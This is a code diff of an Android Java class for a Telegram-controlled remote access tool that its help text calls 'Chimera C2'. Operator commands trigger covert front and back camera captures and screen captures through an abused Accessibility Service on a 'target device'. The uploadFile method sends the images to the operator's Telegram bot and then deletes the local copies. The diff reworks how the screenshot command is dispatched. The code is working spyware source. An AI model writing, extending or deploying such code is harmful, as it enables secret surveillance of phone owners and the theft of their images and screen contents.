@@ -44,7 +44,6 @@ public class TelegramBotWorker implements Runnable {
     }
 
     private void poll() {
-        // This method remains unchanged
         try {
             String token = ConfigLoader.getBotToken();
             long admin = ConfigLoader.getAdminId();
@@ -99,8 +98,6 @@ public class TelegramBotWorker implements Runnable {
         try {
             String text = msg.getString("text");
             long chatId = msg.getJSONObject("chat").getLong("id");
-
-            // UPDATED: Expanded command handling
             switch (text.toLowerCase()) {
                 case "/start":
                 case "/help":
@@ -115,19 +112,17 @@ public class TelegramBotWorker implements Runnable {
         }
     }
 
-    // NEW: Help message function
     private void sendHelpMessage(long chatId) {
-        String helpText = "Chimera C2 Help:\n\n" +
-                "/command - Show the command menu.\n" +
-                "/help - Show this help message.\n\n" +
-                "Available Commands:\n" +
-                "- CAM1: Take a picture with the front camera.\n" +
-                "- CAM2: Take a picture with the back camera.\n" +
+        String helpText = "Chimera C2 Help:\\n\\n" +
+                "/command - Show the command menu.\\n" +
+                "/help - Show this help message.\\n\\n" +
+                "Available Commands:\\n" +
+                "- CAM1: Take a picture with the front camera.\\n" +
+                "- CAM2: Take a picture with the back camera.\\n" +
                 "- SCREENSHOT: Capture the screen. Requires Accessibility Service to be enabled.";
         String body = "{\"chat_id\":" + chatId + ",\"text\":\"" + helpText + "\"}";
         post("https://api.telegram.org/bot" + ConfigLoader.getBotToken() + "/sendMessage", body, context);
     }
-
 
     private void sendMenu(long chatId) {
         try {
@@ -141,7 +136,6 @@ public class TelegramBotWorker implements Runnable {
     }
 
     private void handleCallback(JSONObject cb) {
-        // This method remains unchanged
         try {
             String data = cb.getString("data");
             long chatId = cb.getJSONObject("message").getJSONObject("chat").getLong("id");
@@ -166,12 +160,13 @@ public class TelegramBotWorker implements Runnable {
 
                 case "SCREENSHOT":
                     if (AutoClickerAccessibilityService.isServiceEnabled()) {
-                        post(messageUrl, "{\"chat_id\":" + chatId + ",\"text\":\"Taking screenshot...\"}", context);
-                        Intent intent = new Intent(context, ScreenshotActivity.class);
-                        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-                        context.startActivity(intent);
+                        post(messageUrl, "{\"chat_id\":" + chatId + ",\"text\":\"Preparing for screenshot...\"}", context);
+                        // FIXED: Send a command to the service to prepare itself
+                        Intent intent = new Intent(context, TelegramC2Service.class);
+                        intent.setAction("ACTION_PREPARE_SCREENSHOT");
+                        context.startService(intent);
                     } else {
-                        post(messageUrl, "{\"chat_id\":" + chatId + ",\"text\":\"Screenshot failed: Accessibility Service is not enabled on the target device.\"}", context);
+                        post(messageUrl, "{\"chat_id\":" + chatId + ",\"text\":\"Screenshot failed: Accessibility Service is not enabled.\"}", context);
                     }
                     break;
             }
@@ -181,7 +176,6 @@ public class TelegramBotWorker implements Runnable {
     }
 
     public static void post(String urlStr, String jsonBody, Context context) {
-        // This method remains unchanged
         new Thread(() -> {
             try {
                 URL url = new URL(urlStr);
@@ -204,7 +198,6 @@ public class TelegramBotWorker implements Runnable {
     }
 
     public static void uploadFile(String filePath, long chatId, String caption, Context context) {
-        // This method remains unchanged
         new Thread(() -> {
             String token = ConfigLoader.getBotToken();
             String urlStr = "https://api.telegram.org/bot" + token + "/sendPhoto";
@@ -219,13 +212,10 @@ public class TelegramBotWorker implements Runnable {
                 conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
                 conn.setConnectTimeout(30000);
                 conn.setReadTimeout(30000);
-
                 File fileToUpload = new File(filePath);
                 if (!fileToUpload.exists()) return;
 
-                try (OutputStream os = conn.getOutputStream();
-                     PrintWriter writer = new PrintWriter(os, true)) {
-
+                try (OutputStream os = conn.getOutputStream(); PrintWriter writer = new PrintWriter(os, true)) {
                     writer.append("--").append(boundary).append(LINE_FEED);
                     writer.append("Content-Disposition: form-data; name=\"chat_id\"").append(LINE_FEED);
                     writer.append("Content-Type: text/plain; charset=UTF-8").append(LINE_FEED);
@@ -249,15 +239,12 @@ public class TelegramBotWorker implements Runnable {
                         }
                         os.flush();
                     }
-
                     writer.append(LINE_FEED).flush();
                     writer.append("--").append(boundary).append("--").append(LINE_FEED).flush();
                 }
-
                 conn.getInputStream().close();
                 conn.disconnect();
                 fileToUpload.delete();
-
             } catch (Exception e) {
                 ErrorLogger.logError(context, "TelegramBotWorker_UploadFile", e);
             }
